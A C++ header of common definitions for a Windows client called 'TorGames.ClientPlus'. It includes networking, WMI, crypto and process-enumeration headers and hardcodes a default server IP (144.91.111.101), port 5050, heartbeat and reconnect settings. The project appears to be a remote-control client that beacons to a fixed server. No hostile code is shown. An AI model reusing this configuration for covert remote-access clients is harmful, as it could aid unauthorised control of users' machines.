// TorGames.ClientPlus - Common definitions
#pragma once

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iphlpapi.h>
#include <comdef.h>
#include <Wbemidl.h>
#include <bcrypt.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <winhttp.h>
#include <wininet.h>
#include <psapi.h>
#include <tlhelp32.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <string>
#include <vector>
#include <map>

// Configuration
#define DEFAULT_SERVER "144.91.111.101"
#define DEFAULT_PORT 5050
#define CLIENT_VERSION "1.0.0"
#define HEARTBEAT_INTERVAL 10000
#define RECONNECT_DELAY 5000
#define BUFFER_SIZE 65536
#define MAX_LOG_ENTRIES 500

// Client types
#define CLIENT_TYPE_INSTALLER "INSTALLER"
#define CLIENT_TYPE_CLIENT "CLIENT"

// Forward declarations
struct CommandResult;
class Logger;
class Protocol;
class Client;
